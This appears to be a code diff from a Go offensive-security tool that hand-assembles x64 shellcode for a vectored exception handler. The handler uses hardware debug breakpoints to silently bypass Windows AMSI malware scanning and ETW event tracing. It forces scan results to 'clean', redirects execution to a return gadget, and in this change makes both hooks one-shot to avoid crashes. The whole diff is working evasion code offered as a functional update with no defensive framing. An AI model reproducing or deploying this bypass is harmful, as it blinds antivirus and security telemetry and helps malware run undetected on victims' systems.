@@ -140,13 +140,16 @@ var (
 //  3. Compare ContextRecord->Rip against AMSI addr:
 //     - Write AMSI_RESULT_CLEAN (0) to output param at [Rsp+0x30] (dereferenced)
 //     - Redirect Rip to "xor eax,eax; ret" gadget (returns S_OK)
-//     - Keep Dr0 active (AMSI BP fires on every call for persistent protection)
+//     - One-shot: disable Dr0 (clear Dr7 bit 0)
 //  4. Compare ContextRecord->Rip against ETW addr:
 //     - Redirect Rip to same gadget (returns 0/STATUS_SUCCESS)
-//     - One-shot: disable Dr1 (clear Dr7 bit 2) to prevent repeated firing
-//       from Go runtime threads calling EtwEventWrite during GC/scheduling
+//     - One-shot: disable Dr1 (clear Dr7 bit 2)
 //  5. Clear Dr6, return EXCEPTION_CONTINUE_EXECUTION (-1)
 //  6. If no match → return EXCEPTION_CONTINUE_SEARCH (0)
+//
+// Both breakpoints are one-shot (disabled after first interception per thread)
+// to prevent repeated VEH handler invocations from Go runtime threads calling
+// EtwEventWrite during GC/scheduling, which causes process crashes.
 func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, dataAddr uintptr, err error) {
 	// Allocate 24-byte data block (RW) for target addresses and gadget pointer
 	dataPtr, _, callErr := procVirtualAlloc.Call(
@@ -242,15 +245,38 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	// instruction pushed the return address. The 6th param (AMSI_RESULT*)
 	// is at [RSP+0x30]. We dereference that pointer and write 0 to it.
 	//
-	// AMSI breakpoint stays ACTIVE (Dr7 bit 0 preserved) so it fires on
-	// every AmsiScanBuffer call. ETW is one-shot because Go runtime threads
-	// call EtwEventWrite frequently and repeated VEH invocations cause crashes.
+	// Both AMSI and ETW are one-shot (disable after first interception per
+	// thread) to prevent repeated VEH invocations from Go runtime threads
+	// that cause process crashes.
+
+	// Write AMSI_RESULT_CLEAN to the output parameter before redirecting.
+	// Load context.Rsp into rax: rax = [rbx+0x98]
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
+	code = append(code, 0x98, 0x00, 0x00, 0x00)       // disp32 = 0x98 (Rsp)
+	// Load AMSI_RESULT* from [rax+0x30]: rax = [rax+0x30]
+	code = append(code, 0x48, 0x8B, 0x40, 0x30)       // mov rax, [rax+0x30]
+	// Null-check the pointer before dereferencing
+	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
+	code = append(code, 0x74) // jz skip_result_write (rel8)
+	jzSkipResultOffset := len(code)
+	code = append(code, 0x00) // placeholder
+	// Write AMSI_RESULT_CLEAN (0) to *result: [rax] = 0
+	code = append(code, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00) // mov dword [rax], 0
+	// skip_result_write:
+	skipResultTarget := len(code)
+	code[jzSkipResultOffset] = byte(skipResultTarget - jzSkipResultOffset - 1)
 
 	// Load gadget address from data block: rax = [r13+0x10]
 	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
 	// Set context.Rip to gadget address: [rbx+0xF8] = rax
 	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
 	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
+	// One-shot: disable Dr0 (AMSI breakpoint) by clearing bit 0 of Dr7
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x70]
+	code = append(code, 0x70, 0x00, 0x00, 0x00)       // Dr7 offset
+	code = append(code, 0x48, 0x83, 0xE0, 0xFE)       // and rax, ~1 (clear bit 0)
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x70], rax
+	code = append(code, 0x70, 0x00, 0x00, 0x00)
 	// Clear Dr6: [rbx+0x68] = 0
 	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x68], 0
 	code = append(code, 0x68, 0x00, 0x00, 0x00)
